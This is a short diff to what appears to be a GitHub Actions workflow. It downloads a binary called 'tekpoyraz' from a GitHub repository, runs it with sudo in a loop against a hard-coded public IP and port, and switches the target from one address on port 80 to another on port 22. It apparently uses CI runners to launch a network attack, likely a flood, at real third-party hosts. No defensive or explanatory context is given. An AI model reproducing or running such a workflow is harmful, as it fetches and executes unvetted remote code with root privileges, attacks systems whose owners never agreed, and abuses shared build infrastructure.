@@ -16,7 +16,7 @@ jobs:
           wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
           chmod +x tekpoyraz
           for i in {1..3}; do
-            timeout 20 sudo ./tekpoyraz 145.40.94.153 80
+            timeout 20 sudo ./tekpoyraz 216.202.200.164 22
           done
 
       - name: Bekleme !
